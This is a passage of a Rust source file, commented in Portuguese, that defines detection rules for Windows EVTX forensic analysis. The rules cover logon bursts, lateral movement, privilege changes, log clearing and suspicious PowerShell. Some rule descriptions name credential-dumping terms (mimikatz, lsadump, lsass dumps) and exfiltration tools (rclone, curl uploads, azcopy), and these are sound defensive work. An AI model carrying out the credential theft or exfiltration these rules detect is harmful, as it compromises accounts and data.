//! Regras internas de detecção sobre eventos EVTX (F1-28, ADR-0025).
//!
//! **O que isto é.** Um conjunto pequeno e versionado de regras que olham os
//! eventos já normalizados e produzem **candidatos**: hipóteses com a técnica
//! ATT&CK sugerida, os eventos de origem (`record:N`), os IOCs vistos e o que a
//! regra **não** prova. Nenhum candidato vira achado, mapeamento ATT&CK ou IOC
//! sem confirmação do analista (o app é quem confirma).
//!
//! **O que isto não é.** Não é um EDR nem um SIEM. A regra só enxerga o que o
//! log registrou: um log sem auditoria de processo não revela execução; um log
//! sem auditoria de plataforma de filtragem não revela conexão de saída. A
//! **ausência de candidato não prova ausência de ataque**, e cada regra
//! carrega, em `limitations`, o que ela não consegue afirmar.
//!
//! **Cobertura da demanda** (ver `docs/DETECTION_RULES.md`):
//! vetor inicial (`R-ACCESS-001`, `R-AUTH-002`), movimentação lateral
//! (`R-LATERAL-001..004`), escalonamento de privilégios (`R-PRIV-001..002`),
//! tentativa de exfiltração (`R-EXFIL-001..002`), além de persistência,
//! evasão e acesso a credenciais.
//!
//! Tudo aqui é **limitado**: número de chaves rastreadas, de candidatos, de
//! referências e de IOCs por candidato. Entrada hostil não consegue crescer a
//! memória do engine sem teto.

use dfir_protocol::{
    CandidateIoc, DetectionCandidate, EventFields, ITEM_KIND_DETECTION_CANDIDATE,
    MAX_CANDIDATE_EVENT_REFS, MAX_CANDIDATE_IOCS,
    normalize::{self, epoch_micros},
};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::{
    collections::{BTreeMap, BTreeSet, VecDeque},
    net::IpAddr,
};

/// Versão do conjunto de regras. Muda quando uma regra é criada, removida ou
/// tem o limiar alterado; fica registrada em cada candidato.
pub const RULE_SET_VERSION: &str = "2026.11.1";

/// Falhas de logon na janela para a regra de rajada.
const BURST_THRESHOLD: usize = 10;
/// Janela da rajada (5 minutos), em microssegundos.
const BURST_WINDOW_MICROS: i64 = 5 * 60 * 1_000_000;
/// Depois da última falha da rajada, um logon bem-sucedido em até 30 minutos
/// conta como "sucesso depois de rajada".
const SUCCESS_AFTER_BURST_MICROS: i64 = 30 * 60 * 1_000_000;
/// Teto de candidatos e de chaves de rajada rastreadas.
const MAX_CANDIDATES: usize = 5_000;
const MAX_BURST_KEYS: usize = 50_000;
/// Primeiras referências guardadas por candidato; o resto é a "cauda".
const HEAD_REFS: usize = 15;
const TAIL_REFS: usize = MAX_CANDIDATE_EVENT_REFS - HEAD_REFS;
/// Contas distintas lembradas por rajada (para distinguir força bruta de spray).
const MAX_TRACKED_USERS: usize = 50;

/// Uma regra: metadados fixos e legíveis.
pub struct Rule {
    pub id: &'static str,
    pub version: &'static str,
    pub title: &'static str,
    pub description: &'static str,
    pub tactic: &'static str,
    pub technique: &'static str,
    pub sub_technique: Option<&'static str>,
    pub severity: &'static str,
    pub confidence: &'static str,
    pub limitations: &'static str,
}

const R_AUTH_001: Rule = Rule {
    id: "R-AUTH-001",
    version: "1",
    title: "Rajada de falhas de logon",
    description: "Dez ou mais falhas de logon (4625) para a mesma origem ou a mesma conta em até 5 minutos.",
    tactic: "CREDENTIAL_ACCESS",
    technique: "T1110",
    sub_technique: None,
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Falhas em rajada também vêm de serviço com senha vencida ou de usuário que esqueceu a senha; a regra não distingue ataque de erro operacional.",
};
const R_AUTH_002: Rule = Rule {
    id: "R-AUTH-002",
    version: "1",
    title: "Logon bem-sucedido depois de rajada de falhas",
    description: "Um logon bem-sucedido (4624) para a mesma origem ou conta, em até 30 minutos depois de uma rajada de falhas.",
    tactic: "INITIAL_ACCESS",
    technique: "T1078",
    sub_technique: None,
    severity: "HIGH",
    confidence: "MEDIUM",
    limitations: "Indica que a tentativa de adivinhar a senha pode ter funcionado; não prova que o logon foi do atacante.",
};
const R_ACCESS_001: Rule = Rule {
    id: "R-ACCESS-001",
    version: "1",
    title: "Logon remoto a partir de IP público",
    description: "Logon de rede (tipo 3) ou de área de trabalho remota (tipo 10) bem-sucedido com origem em endereço IP público.",
    tactic: "INITIAL_ACCESS",
    technique: "T1078",
    sub_technique: None,
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Acesso remoto legítimo (VPN com saída pública, teletrabalho) tem o mesmo aspecto; a regra não conhece a lista de origens autorizadas.",
};
const R_LATERAL_001: Rule = Rule {
    id: "R-LATERAL-001",
    version: "1",
    title: "Área de trabalho remota a partir de máquina interna",
    description: "Logon do tipo 10 (RDP) bem-sucedido com origem em endereço interno, que não o da própria máquina.",
    tactic: "LATERAL_MOVEMENT",
    technique: "T1021",
    sub_technique: Some("T1021.001"),
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Administração remota legítima por RDP é idêntica no log; o candidato só aponta quem acessou quem.",
};
const R_LATERAL_002: Rule = Rule {
    id: "R-LATERAL-002",
    version: "1",
    title: "Credenciais explícitas contra outro servidor",
    description: "Logon com credenciais explícitas (4648) cujo servidor de destino não é a própria máquina.",
    tactic: "LATERAL_MOVEMENT",
    technique: "T1021",
    sub_technique: None,
    severity: "LOW",
    confidence: "LOW",
    limitations: "Comum em tarefas agendadas e mapeamento de unidades; só vale como pista quando combinado com outros candidatos.",
};
const R_LATERAL_003: Rule = Rule {
    id: "R-LATERAL-003",
    version: "1",
    title: "Acesso a compartilhamento administrativo",
    description: "Acesso a ADMIN$ ou a um compartilhamento de unidade (C$, D$...) por origem remota (eventos 5140 e 5145).",
    tactic: "LATERAL_MOVEMENT",
    technique: "T1021",
    sub_technique: Some("T1021.002"),
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Ferramentas de inventário e de backup acessam esses compartilhamentos; exige auditoria de compartilhamento ligada para existir.",
};
const R_LATERAL_004: Rule = Rule {
    id: "R-LATERAL-004",
    version: "1",
    title: "Serviço típico de execução remota",
    description: "Serviço instalado com nome ou caminho típico de execução remota (PsExec e similares) ou com imagem em ADMIN$/UNC.",
    tactic: "LATERAL_MOVEMENT",
    technique: "T1021",
    sub_technique: Some("T1021.002"),
    severity: "HIGH",
    confidence: "MEDIUM",
    limitations: "Administradores também usam PsExec; o candidato mostra a instalação, não quem a ordenou nem para quê.",
};
const R_PRIV_001: Rule = Rule {
    id: "R-PRIV-001",
    version: "1",
    title: "Conta com privilégios sensíveis em uso",
    description: "Logon de conta de usuário com SeDebug, SeTcb ou SeLoadDriver atribuídos (evento 4672).",
    tactic: "PRIVILEGE_ESCALATION",
    technique: "T1078",
    sub_technique: Some("T1078.003"),
    severity: "LOW",
    confidence: "LOW",
    limitations: "Todo administrador recebe esses privilégios em todo logon; o candidato lista quem os tem, não prova abuso nem elevação.",
};
const R_PRIV_002: Rule = Rule {
    id: "R-PRIV-002",
    version: "1",
    title: "Conta adicionada a grupo privilegiado",
    description: "Membro adicionado a Administradores, Domain Admins, Enterprise Admins, Schema Admins ou a um grupo de operadores (4728, 4732, 4756).",
    tactic: "PRIVILEGE_ESCALATION",
    technique: "T1098",
    sub_technique: None,
    severity: "HIGH",
    confidence: "LOW",
    limitations: "É mudança administrativa válida quando autorizada; a regra não sabe se houve chamado ou aprovação.",
};
const R_PERS_001: Rule = Rule {
    id: "R-PERS-001",
    version: "1",
    title: "Conta de usuário criada",
    description: "Criação de conta de usuário (evento 4720).",
    tactic: "PERSISTENCE",
    technique: "T1136",
    sub_technique: None,
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Contas são criadas por motivos legítimos todos os dias; vale como pista quando a conta nova aparece em logon ou em grupo privilegiado.",
};
const R_PERS_002: Rule = Rule {
    id: "R-PERS-002",
    version: "1",
    title: "Serviço instalado",
    description: "Instalação de serviço (7045 ou 4697); gravidade sobe quando a imagem está em pasta temporária ou de perfil, ou usa interpretador de comandos.",
    tactic: "PERSISTENCE",
    technique: "T1543",
    sub_technique: Some("T1543.003"),
    severity: "LOW",
    confidence: "LOW",
    limitations: "Instalação de software legítimo registra o mesmo evento; o caminho da imagem é a única pista usada.",
};
const R_PERS_003: Rule = Rule {
    id: "R-PERS-003",
    version: "1",
    title: "Tarefa agendada criada",
    description: "Criação de tarefa agendada (evento 4698); gravidade sobe quando o comando usa interpretador de scripts ou pasta temporária.",
    tactic: "PERSISTENCE",
    technique: "T1053",
    sub_technique: Some("T1053.005"),
    severity: "LOW",
    confidence: "LOW",
    limitations: "Sistemas e aplicativos criam tarefas o tempo todo; só o comando da tarefa, quando presente, ajuda a distinguir.",
};
const R_EVAS_001: Rule = Rule {
    id: "R-EVAS-001",
    version: "1",
    title: "Log de eventos apagado",
    description: "Limpeza do log Security (1102) ou System (104).",
    tactic: "DEFENSE_EVASION",
    technique: "T1070",
    sub_technique: Some("T1070.001"),
    severity: "HIGH",
    confidence: "MEDIUM",
    limitations: "Administradores limpam logs em manutenção; mas a limpeza também é o gesto típico de quem quer apagar rastros. Exige conferir quem limpou e por quê.",
};
const R_EVAS_002: Rule = Rule {
    id: "R-EVAS-002",
    version: "1",
    title: "Política de auditoria alterada",
    description: "Alteração da política de auditoria do sistema (evento 4719).",
    tactic: "DEFENSE_EVASION",
    technique: "T1562",
    sub_technique: Some("T1562.002"),
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Mudanças de política são administrativas; a regra não vê se a auditoria foi reduzida ou ampliada.",
};
const R_EXEC_001: Rule = Rule {
    id: "R-EXEC-001",
    version: "1",
    title: "PowerShell com comando codificado ou download",
    description: "Linha de comando ou bloco de script do PowerShell com comando codificado em Base64, download de conteúdo ou execução dinâmica.",
    tactic: "EXECUTION",
    technique: "T1059",
    sub_technique: Some("T1059.001"),
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Exige auditoria de criação de processo com linha de comando (4688) ou log do PowerShell; scripts de administração também usam Base64.",
};
const R_CRED_001: Rule = Rule {
    id: "R-CRED-001",
    version: "2",
    title: "Indicador de extração de credenciais",
    description: "Linha de comando ou bloco de script com termos típicos de extração de credenciais (mimikatz, sekurlsa, lsadump, cópia de SAM/NTDS, dump de lsass e MiniDumpWriteDump de LSASS).",
    tactic: "CREDENTIAL_ACCESS",
    technique: "T1003",
    sub_technique: None,
    severity: "HIGH",
    confidence: "MEDIUM",
    limitations: "Casamento por texto: pega a tentativa, inclusive de teste de equipe de segurança, e não pega ferramenta renomeada ou ofuscada.",
};
const R_EXFIL_001: Rule = Rule {
    id: "R-EXFIL-001",
    version: "1",
    title: "Ferramenta de envio de dados por linha de comando",
    description: "Linha de comando com ferramenta ou opção típica de envio de dados para fora (rclone, mega, curl/Invoke-WebRequest com envio, WinSCP, azcopy, aws s3).",
    tactic: "EXFILTRATION",
    technique: "T1567",
    sub_technique: None,
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Mostra a tentativa de usar a ferramenta, não o volume nem o destino real dos dados; sem log de rede não há como confirmar a transferência.",
};
const R_EXFIL_002: Rule = Rule {
    id: "R-EXFIL-002",
    version: "1",
    title: "Conexão de saída de ferramenta de linha de comando para IP público",
    description: "Conexão de saída permitida (5156 ou Sysmon 3) para IP público iniciada por PowerShell, cmd, curl, certutil, bitsadmin ou similar.",
    tactic: "EXFILTRATION",
    technique: "T1041",
    sub_technique: None,
    severity: "MEDIUM",
    confidence: "LOW",
    limitations: "Pode ser exfiltração, comando e controle ou simples download; sem a carga transferida a regra não distingue. Exige auditoria da plataforma de filtragem (5156) ou Sysmon.",
};
const R_COLL_001: Rule = Rule {
    id: "R-COLL-001",
    version: "1",
    title: "Compactação de dados por linha de comando",
    description: "Linha de comando que compacta arquivos (Compress-Archive, 7z, rar, zip), etapa comum antes de enviar dados para fora.",
    tactic: "COLLECTION",
    technique: "T1560",
    sub_technique: Some("T1560.001"),
    severity: "LOW",
    confidence: "LOW",
    limitations: "Compactar arquivos é rotina; só ganha peso junto de R-EXFIL-001 ou R-EXFIL-002 na mesma máquina e conta.",
};

/// Catálogo completo, em ordem de apresentação.
pub fn catalogue() -> &'static [&'static Rule] {
    &[
        &R_AUTH_001,
        &R_AUTH_002,
        &R_ACCESS_001,
        &R_LATERAL_001,
        &R_LATERAL_002,
        &R_LATERAL_003,
        &R_LATERAL_004,
        &R_PRIV_001,
        &R_PRIV_002,
        &R_PERS_001,
        &R_PERS_002,
        &R_PERS_003,
        &R_EVAS_001,
        &R_EVAS_002,
        &R_EXEC_001,
        &R_CRED_001,
        &R_EXFIL_001,
        &R_EXFIL_002,
        &R_COLL_001,
    ]
}

// ---------------------------------------------------------------------------
// Utilitários de texto e de rede
// ---------------------------------------------------------------------------

/// `true` para endereço IP **público**: fora de faixas privadas, de loopback,
/// de link local, CGNAT, multicast, documentação e outras de uso especial.
pub fn is_public_ip(text: &str) -> bool {
    let Ok(ip) = text.trim().trim_matches(['[', ']']).parse::<IpAddr>() else {
        return false;
    };
    match ip {
        IpAddr::V4(v4) => {
            let [a, b, c, _] = v4.octets();
            !(v4.is_private()
                || v4.is_loopback()
                || v4.is_link_local()
                || v4.is_unspecified()
                || v4.is_broadcast()
                || v4.is_multicast()
                || (a == 100 && (64..=127).contains(&b)) // CGNAT 100.64/10
                || a == 0
                || a >= 240 // reservado / classe E
                || (a == 192 && b == 0 && c == 0) // 192.0.0.0/24
                || (a == 192 && b == 0 && c == 2) // documentação
                || (a == 198 && b == 51 && c == 100)
                || (a == 203 && b == 0 && c == 113)
                || (a == 198 && (b == 18 || b == 19))) // teste de desempenho
        }
        IpAddr::V6(v6) => {
            if let Some(v4) = v6.to_ipv4_mapped() {
                return is_public_ip(&v4.to_string());
            }
            let first = v6.segments()[0];
            !(v6.is_loopback()
                || v6.is_unspecified()
                || v6.is_multicast()
                || (first & 0xFFC0) == 0xFE80 // link local
                || (first & 0xFE00) == 0xFC00 // única local
                || (first == 0x2001 && v6.segments()[1] == 0x0DB8)) // documentação
        }
    }
}

/// Endereço da própria máquina ou ausente.
fn is_loopback_or_local(text: &str) -> bool {
    let value = text.trim();
    value.is_empty()
        || value == "-"
        || value == "::1"
        || value == "127.0.0.1"
        || value.starts_with("127.")
        || value.eq_ignore_ascii_case("localhost")
}

fn is_ip(text: &str) -> bool {
    text.trim().parse::<IpAddr>().is_ok()
}

fn basename(path: &str) -> &str {
    path.rsplit(['\\', '/']).next().unwrap_or(path)
}

/// URLs `http(s)://...` encontradas no texto (no máximo `limit`).
fn extract_urls(text: &str, limit: usize) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut urls = Vec::new();
    let mut from = 0;
    while urls.len() < limit {
        let Some(start) = ["http://", "https://"]
            .iter()
            .filter_map(|scheme| lower[from..].find(scheme).map(|at| at + from))
            .min()
        else {
            break;
        };
        let rest = &text[start..];
        let end = rest
            .find(|ch: char| {
                ch.is_whitespace() || matches!(ch, '"' | '\'' | '`' | ')' | '>' | '<' | '|' | ',')
            })
            .unwrap_or(rest.len());
        let candidate = rest[..end].trim_end_matches(['.', ';', ')', ']']);
        if candidate.len() > 10 {
            urls.push(candidate.chars().take(300).collect());
        }
        from = start + end.max(1);
        if from >= text.len() {
            break;
        }
    }
    urls
}

fn lower_contains_any(lower: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| lower.contains(needle))
}

/// Contas de sistema, que recebem privilégios e fazem logon o tempo todo.
fn is_system_account(name: &str) -> bool {
    let upper = name.trim().to_ascii_uppercase();
    upper.ends_with('$')
        || matches!(
            upper.as_str(),
            "SYSTEM"
                | "LOCAL SERVICE"
                | "NETWORK SERVICE"
                | "ANONYMOUS LOGON"
                | "SERVIÇO LOCAL"
                | "SERVIÇO DE REDE"
        )
        || upper.starts_with("DWM-")
        || upper.starts_with("UMFD-")
        || upper.starts_with("NT AUTHORITY")
        || upper.starts_with("NT SERVICE")
        || upper.starts_with("FONT DRIVER HOST")
        || upper.starts_with("WINDOW MANAGER")
}

// ---------------------------------------------------------------------------
// Evento visto pelas regras
// ---------------------------------------------------------------------------

pub struct Ev<'a> {
    pub record_id: u64,
    pub timestamp: &'a str,
    pub micros: Option<i64>,
    pub id: u32,
    pub data: &'a Value,
    pub fields: &'a EventFields,
}

impl Ev<'_> {
    fn reference(&self) -> String {
        format!("record:{}", self.record_id)
    }

    fn d(&self, key: &str) -> Option<String> {
        normalize::data_text(self.data, key)
    }

    fn provider_contains(&self, needle: &str) -> bool {
        self.fields.provider.as_deref().is_some_and(|name| {
            name.to_ascii_lowercase()
                .contains(&needle.to_ascii_lowercase())
        })
    }
}

// ---------------------------------------------------------------------------
// Agregação
// ---------------------------------------------------------------------------

struct Agg {
    rule: &'static Rule,
    severity: &'static str,
    confidence: &'static str,
    sub_technique: Option<&'static str>,
    key: String,
    aggregation: String,
    detail: String,
    count: u64,
    first: (i64, String),
    last: (i64, String),
    head: Vec<String>,
    tail: VecDeque<String>,
    refs_total: u64,
    host: Option<String>,
    user: Option<String>,
    src_ip: Option<String>,
    iocs: Vec<CandidateIoc>,
    users: BTreeSet<String>,
}

impl Agg {
    fn new(rule: &'static Rule, key: String, aggregation: String, ev: &Ev<'_>) -> Self {
        Self {
            rule,
            severity: rule.severity,
            confidence: rule.confidence,
            sub_technique: rule.sub_technique,
            key,
            aggregation,
            detail: String::new(),
            count: 0,
            first: (i64::MAX, String::new()),
            last: (i64::MIN, String::new()),
            head: Vec::new(),
            tail: VecDeque::new(),
            refs_total: 0,
            host: ev.fields.host.clone(),
            user: ev.fields.user.clone(),
            src_ip: ev.fields.src_ip.clone().filter(|ip| is_ip(ip)),
            iocs: Vec::new(),
            users: BTreeSet::new(),
        }
    }

    fn add_raw(&mut self, reference: &str, micros: Option<i64>, timestamp: &str) {
        self.count += 1;
        self.refs_total += 1;
        let stamp = micros.unwrap_or(0);
        if self.first.1.is_empty() || stamp < self.first.0 {
            self.first = (stamp, timestamp.to_string());
        }
        if self.last.1.is_empty() || stamp >= self.last.0 {
            self.last = (stamp, timestamp.to_string());
        }
        if self.head.len() < HEAD_REFS {
            self.head.push(reference.to_string());
        } else {
            self.tail.push_back(reference.to_string());
            if self.tail.len() > TAIL_REFS {
                self.tail.pop_front();
            }
        }
    }

    fn add(&mut self, ev: &Ev<'_>) {
        self.add_raw(&ev.reference(), ev.micros, ev.timestamp);
    }

    fn ioc(&mut self, ioc_type: &str, value: &str, event_ref: &str) {
        let value = value.trim();
        if value.is_empty()
            || self.iocs.len() >= MAX_CANDIDATE_IOCS
            || self
                .iocs
                .iter()
                .any(|existing| existing.ioc_type == ioc_type && existing.value == value)
        {
            return;
        }
        self.iocs.push(CandidateIoc {
            ioc_type: ioc_type.into(),
            value: value.chars().take(300).collect(),
            event_ref: event_ref.into(),
        });
    }

    fn into_candidate(self, evidence_id: &str) -> DetectionCandidate {
        let mut event_refs = self.head;
        event_refs.extend(self.tail);
        let refs_truncated = self.refs_total > event_refs.len() as u64;
        let description = if self.detail.is_empty() {
            self.rule.description.to_string()
        } else {
            format!("{} {}", self.rule.description, self.detail)
        };
        let mut hasher = Sha256::new();
        hasher.update(self.rule.id.as_bytes());
        hasher.update([0]);
        hasher.update(self.rule.version.as_bytes());
        hasher.update([0]);
        hasher.update(self.key.as_bytes());
        let digest = hasher.finalize();
        let candidate_key: String = digest
            .iter()
            .take(16)
            .map(|byte| format!("{byte:02x}"))
            .collect();
        DetectionCandidate {
            kind: ITEM_KIND_DETECTION_CANDIDATE.into(),
            evidence_id: evidence_id.into(),
            rule_id: self.rule.id.into(),
            rule_version: self.rule.version.into(),
            rule_set_version: RULE_SET_VERSION.into(),
            title: self.rule.title.into(),
            description,
            tactic: self.rule.tactic.into(),
            technique_id: self.rule.technique.into(),
            sub_technique_id: self.sub_technique.map(str::to_string),
            severity: self.severity.into(),
            confidence: self.confidence.into(),
            candidate_key,
            aggregation: self.aggregation,
            count: self.count,
            first_seen: self.first.1,
            last_seen: self.last.1,
            event_refs,
            refs_truncated,
            host: self.host,
            user: self.user,
            src_ip: self.src_ip,
            iocs: self.iocs,
            limitations: self.rule.limitations.into(),
        }
    }
}

struct Burst {
    recent: VecDeque<(Option<i64>, String, String)>,
    flagged: bool,
    last_failure: i64,
}

/// Contadores do que a detecção viu e descartou.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct DetectorStats {
    pub events_seen: u64,
    pub candidates: u64,
    /// Candidatos que não couberam no teto (`MAX_CANDIDATES`).
    pub dropped_candidates: u64,
    /// Chaves de rajada que não couberam (`MAX_BURST_KEYS`).
    pub dropped_burst_keys: u64,
}

pub struct Detector {
    evidence_id: String,
    aggs: BTreeMap<String, Agg>,
    bursts: BTreeMap<String, Burst>,
    stats: DetectorStats,
}

impl Detector {
    pub fn new(evidence_id: &str) -> Self {
        Self {
            evidence_id: evidence_id.into(),
            aggs: BTreeMap::new(),
            bursts: BTreeMap::new(),
            stats: DetectorStats::default(),
        }
    }

    /// Obtém (ou cria) o agregado de `rule` para `key`. `None` se o teto de
    /// candidatos foi atingido (o evento é contado em `dropped_candidates`).
    fn agg(
        &mut self,
        rule: &'static Rule,
        key: &str,
        aggregation: impl FnOnce() -> String,
        ev: &Ev<'_>,
    ) -> Option<&mut Agg> {
        let map_key = format!("{}\u{1}{}", rule.id, key);
        if !self.aggs.contains_key(&map_key) {
            if self.aggs.len() >= MAX_CANDIDATES {
                self.stats.dropped_candidates += 1;
                return None;
            }
            self.aggs.insert(
                map_key.clone(),
                Agg::new(rule, key.to_string(), aggregation(), ev),
            );
        }
        self.aggs.get_mut(&map_key)
    }

    pub fn observe(&mut self, ev: &Ev<'_>) {
        self.stats.events_seen += 1;
        match ev.id {
            4625 => self.failed_logon(ev),
            4624 => self.logon(ev),
            4648 => self.explicit_credentials(ev),
            4672 => self.special_privileges(ev),
            4720 => self.account_created(ev),
            4728 | 4732 | 4756 => self.group_member_added(ev),
            7045 | 4697 => self.service_installed(ev),
            4698 => self.scheduled_task(ev),
            1102 | 104 if ev.provider_contains("eventlog") => self.log_cleared(ev),
            4719 => self.audit_policy_changed(ev),
            5140 | 5145 => self.admin_share(ev),
            _ => {}
        }
        if let Some(command) = ev.fields.command_line.clone() {
            self.command_line(ev, &command);
        }
        if ev.fields.action.as_deref() == Some("network_connection") {
            self.outbound_connection(ev);
        }
    }

    // --- autenticação --------------------------------------------------------

    fn failed_logon(&mut self, ev: &Ev<'_>) {
        let mut keys: Vec<(String, String)> = Vec::new();
        if let Some(ip) = ev
            .fields
            .src_ip
            .as_deref()
            .filter(|ip| is_ip(ip) && !is_loopback_or_local(ip))
        {
            keys.push((format!("ip:{ip}"), format!("origem={ip}")));
        }
        if let Some(user) = ev.fields.user.as_deref() {
            keys.push((
                format!("user:{}", user.to_ascii_lowercase()),
                format!("conta={user}"),
            ));
        }
        for (key, aggregation) in keys {
            if !self.bursts.contains_key(&key) && self.bursts.len() >= MAX_BURST_KEYS {
                self.stats.dropped_burst_keys += 1;
                continue;
            }
            let entry = (ev.micros, ev.timestamp.to_string(), ev.reference());
            let burst = self.bursts.entry(key.clone()).or_insert_with(|| Burst {
                recent: VecDeque::new(),
                flagged: false,
                last_failure: i64::MIN,
            });
            burst.last_failure = ev.micros.unwrap_or(burst.last_failure);
            let was_flagged = burst.flagged;
            burst.recent.push_back(entry.clone());
            if burst.recent.len() > BURST_THRESHOLD {
                burst.recent.pop_front();
            }
            let spans_window = burst.recent.len() == BURST_THRESHOLD
                && match (
                    burst.recent.front().and_then(|e| e.0),
                    burst.recent.back().and_then(|e| e.0),
                ) {
                    (Some(first), Some(last)) => last - first <= BURST_WINDOW_MICROS,
                    _ => false,
                };
            let seed: Vec<(Option<i64>, String, String)> = if !was_flagged && spans_window {
                burst.flagged = true;
                burst.recent.iter().cloned().collect()
            } else {
                Vec::new()
            };
            let now_flagged = burst.flagged;
            if !now_flagged {
                continue;
            }
            let agg_key = key.clone();
            let Some(agg) = self.agg(&R_AUTH_001, &agg_key, || aggregation, ev) else {
                continue;
            };
            if !seed.is_empty() {
                for (micros, timestamp, reference) in &seed {
                    agg.add_raw(reference, *micros, timestamp);
                }
            } else {
                agg.add(ev);
            }
            if let Some(user) = ev.fields.user.as_deref()
                && agg.users.len() < MAX_TRACKED_USERS
            {
                agg.users.insert(user.to_ascii_lowercase());
            }
            if let Some(ip) = ev.fields.src_ip.as_deref().filter(|ip| is_ip(ip)) {
                agg.ioc("IP", ip, &entry.2);
            }
        }
    }

    fn logon(&mut self, ev: &Ev<'_>) {
        let logon_type: Option<u32> = ev.d("LogonType").and_then(|value| value.parse().ok());
        let user = ev.fields.user.clone();
        let ip = ev.fields.src_ip.clone().filter(|ip| is_ip(ip));

        // R-AUTH-002: sucesso depois de rajada (mesma origem ou mesma conta).
        let mut previous_failures: Vec<(Option<i64>, String, String)> = Vec::new();
        for key in [
            ip.as_deref().map(|ip| format!("ip:{ip}")),
            user.as_deref()
                .map(|user| format!("user:{}", user.to_ascii_lowercase())),
        ]
        .into_iter()
        .flatten()
        {
            if let Some(burst) = self.bursts.get(&key)
                && burst.flagged
                && let Some(now) = ev.micros
                && now >= burst.last_failure
                && now - burst.last_failure <= SUCCESS_AFTER_BURST_MICROS
            {
                previous_failures.extend(burst.recent.iter().cloned());
            }
        }
        let user_is_system = user.as_deref().is_some_and(is_system_account);
        if !previous_failures.is_empty() && !user_is_system {
            let who = user.clone().unwrap_or_else(|| "?".into());
            let from = ip.clone().unwrap_or_else(|| "?".into());
            let key = format!("{}|{}", who.to_ascii_lowercase(), from);
            let aggregation = format!("conta={who}; origem={from}");
            if let Some(agg) = self.agg(&R_AUTH_002, &key, || aggregation, ev) {
                if agg.count == 0 {
                    for (micros, timestamp, reference) in &previous_failures {
                        agg.add_raw(reference, *micros, timestamp);
                    }
                }
                agg.add(ev);
                if let Some(ip) = ip.as_deref() {
                    agg.ioc("IP", ip, &ev.reference());
                }
            }
        }

        let (Some(logon_type), Some(ip)) = (logon_type, ip) else {
            return;
        };
        if is_loopback_or_local(&ip) {
            return;
        }
        let who = user.clone().unwrap_or_else(|| "?".into());
        // R-ACCESS-001: acesso remoto de IP público.
        if matches!(logon_type, 3 | 10) && is_public_ip(&ip) {
            let key = format!("{}|{}", who.to_ascii_lowercase(), ip);
            let aggregation = format!("conta={who}; origem={ip}");
            let rdp = logon_type == 10;
            if let Some(agg) = self.agg(&R_ACCESS_001, &key, || aggregation, ev) {
                if rdp {
                    agg.severity = "HIGH";
                    agg.sub_technique = None;
                }
                agg.detail = if rdp {
                    "Tipo de logon 10 (área de trabalho remota).".into()
                } else {
                    "Tipo de logon 3 (rede).".into()
                };
                agg.add(ev);
                agg.ioc("IP", &ip, &ev.reference());
            }
        }
        // R-LATERAL-001: RDP vindo de máquina interna.
        if logon_type == 10 && !is_public_ip(&ip) {
            let key = format!("{}|{}", who.to_ascii_lowercase(), ip);
            let aggregation = format!("conta={who}; origem={ip}");
            if let Some(agg) = self.agg(&R_LATERAL_001, &key, || aggregation, ev) {
                agg.add(ev);
                agg.ioc("IP", &ip, &ev.reference());
            }
        }
    }

    fn explicit_credentials(&mut self, ev: &Ev<'_>) {
        let Some(target) = ev.d("TargetServerName") else {
            return;
        };
        let own_host = ev.fields.host.clone().unwrap_or_default();
        let first_label = |name: &str| name.split('.').next().unwrap_or(name).to_ascii_lowercase();
        if target.eq_ignore_ascii_case("localhost")
            || (!own_host.is_empty() && first_label(&target) == first_label(&own_host))
        {
            return;
        }
        let subject = ev.d("SubjectUserName").unwrap_or_else(|| "?".into());
        let used = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let key = format!(
            "{}|{}|{}",
            subject.to_ascii_lowercase(),
            used.to_ascii_lowercase(),
            target.to_ascii_lowercase()
        );
        let aggregation = format!("conta={subject}; credenciais de {used}; servidor={target}");
        if let Some(agg) = self.agg(&R_LATERAL_002, &key, || aggregation, ev) {
            agg.user = Some(subject);
            agg.add(ev);
            let kind = if is_ip(&target) { "IP" } else { "HOSTNAME" };
            agg.ioc(kind, &target, &ev.reference());
        }
    }

    // --- privilégios e contas ---------------------------------------------

    fn special_privileges(&mut self, ev: &Ev<'_>) {
        let Some(user) = ev.fields.user.clone() else {
            return;
        };
        if is_system_account(&user) {
            return;
        }
        let privileges = ev.d("PrivilegeList").unwrap_or_default();
        let sensitive: Vec<&str> = [
            "SeDebugPrivilege",
            "SeTcbPrivilege",
            "SeLoadDriverPrivilege",
        ]
        .into_iter()
        .filter(|name| privileges.contains(name))
        .collect();
        if sensitive.is_empty() {
            return;
        }
        let key = user.to_ascii_lowercase();
        let aggregation = format!("conta={user}");
        let detail = format!("Privilégios: {}.", sensitive.join(", "));
        if let Some(agg) = self.agg(&R_PRIV_001, &key, || aggregation, ev) {
            agg.detail = detail;
            agg.add(ev);
        }
    }

    fn account_created(&mut self, ev: &Ev<'_>) {
        let Some(account) = ev.fields.user.clone() else {
            return;
        };
        let by = ev.d("SubjectUserName").unwrap_or_else(|| "?".into());
        let key = account.to_ascii_lowercase();
        let aggregation = format!("conta criada={account}; por={by}");
        if let Some(agg) = self.agg(&R_PERS_001, &key, || aggregation, ev) {
            agg.detail = format!("Conta criada por {by}.");
            agg.add(ev);
        }
    }

    fn group_member_added(&mut self, ev: &Ev<'_>) {
        let group = ev.d("TargetUserName").unwrap_or_else(|| "?".into());
        let sid = ev.d("TargetSid").unwrap_or_default();
        let privileged_sid = [
            "-512",
            "-518",
            "-519",
            "-520",
            "S-1-5-32-544",
            "S-1-5-32-548",
            "S-1-5-32-549",
            "S-1-5-32-550",
            "S-1-5-32-551",
        ]
        .iter()
        .any(|suffix| {
            if suffix.starts_with("S-1-5-32") {
                sid == *suffix
            } else {
                sid.ends_with(suffix)
            }
        });
        let name = group.to_ascii_lowercase();
        let privileged_name = [
            "administrators",
            "administradores",
            "domain admins",
            "admins. do domínio",
            "enterprise admins",
            "schema admins",
            "backup operators",
            "account operators",
            "server operators",
            "print operators",
        ]
        .contains(&name.as_str());
        if !(privileged_sid || privileged_name) {
            return;
        }
